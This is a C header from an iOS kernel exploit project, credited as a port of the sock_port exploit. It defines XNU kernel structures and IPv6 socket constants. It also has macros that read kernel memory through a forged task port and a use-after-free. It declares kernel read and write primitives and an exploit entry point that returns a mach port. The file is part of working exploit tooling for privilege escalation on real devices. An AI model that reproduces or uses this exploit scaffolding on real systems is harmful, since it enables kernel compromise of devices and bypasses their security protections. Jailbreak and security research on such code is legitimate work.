//
//  s0cket.h
//  socket
//
//  Created by staturnz on 1/24/23.
//  Copyright Â© 2023 Staturnz. All rights reserved.
//
//  sock_port by jakeajames
//  https://github.com/jakeajames/sock_port
//

#ifndef s0cket_h
#define s0cket_h

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/utsname.h>

#include "include/IOKit/IOKitLib.h"
#include "iosurface.h"
#include "offsets.h"

#define IMAGE_OFFSET 0x1000
#define MACHO_HEADER_MAGIC MH_MAGIC
#define KERNEL_SEARCH_ADDRESS 0x81200000
#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63
#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_TASK 2
#define IKOT_CLOCK 25
#define IKOT_IOKIT_CONNECT 29
#define kOSSerializeBinarySignature 0x000000D3U
#define WQT_QUEUE 0x2
#define _EVENT_MASK_BITS ((sizeof(uint32_t) * 8) - 7)

#define concat(a,b) [NSString stringWithFormat:a, b]
#define rk32_check(addr) ({ uint32_t r; r = rk32_via_uaf(addr); if (!r) { usleep(100); r = rk32_via_uaf(addr); if (!r) { printf("[-] failed to read from '"#addr"'\n"); goto err;}}; r;})
#define kr32(addr, value)\
        read(port_fds[0], (void *)fakeport, sizeof(kport_t) + fake_task_size);\
        *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + fake_task_size);\
        value = 0x0;\
        ret = pid_for_task(our_port, (int *)&value);

kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);;
kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);

vm_address_t get_k_base(task_t kt);
uint32_t rk32(uint32_t where);
size_t kwrite(uint32_t where, const void *p, size_t size);
void wk8(uint32_t where, uint8_t what);
void wk16(uint32_t where, uint16_t what);
void wk32(uint32_t where, uint32_t what);
    
enum {
    kOSSerializeArray               = 0x02000000U,
    kOSSerializeSet                 = 0x03000000U,
    kOSSerializeNumber              = 0x04000000U,
    kOSSerializeSymbol              = 0x08000000U,
    kOSSerializeString              = 0x09000000U,
    kOSSerializeData                = 0x0a000000U,
    kOSSerializeBoolean             = 0x0b000000U,
    kOSSerializeObject              = 0x0c000000U,
    kOSSerializeTypeMask            = 0x7F000000U,
    kOSSerializeDataMask            = 0x00FFFFFFU,
    kOSSerializeEndCollection       = 0x80000000U,
    kOSSerializeMagic               = 0x000000d3U,
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct route_in6 {
    struct rtentry *ro_rt;
    struct llentry *ro_lle;
    struct ifaddr *ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr *ip6po_rhi_rthdr;
    struct route_in6 ip6po_rhi_route;
};

struct ip6po_nhinfo {
    struct sockaddr *ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route;
};

struct ip6_pktopts {
    struct mbuf *ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo *ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh *ip6po_hbh;
    struct ip6_dest *ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest *ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint32_t data;
        uint32_t type;
    } ip_lock;
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint32_t next;
                    uint32_t prev;
                } waitq_queue;
            } waitq;
            uint32_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
        } port;
        uint32_t klist;
    } ip_messages;
    uint32_t ip_receiver;
    uint32_t ip_kobject;
    uint32_t ip_nsrequest;
    uint32_t ip_pdrequest;
    uint32_t ip_requests;
    uint32_t ip_premsg;
    uint32_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    struct {
        uint32_t data;
        uint32_t reserved:24,
        type:8;
    } lock;
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t map;
} ktask_t;

union waitq_flags {
    struct {
        uint32_t
        waitq_type:2,
        waitq_fifo:1,
        waitq_prepost:1,
        waitq_irq:1,
        waitq_isvalid:1,
        waitq_turnstile_or_port:1,
        waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};

mach_port_t s0cket(void);
#endif /* s0cket_h */
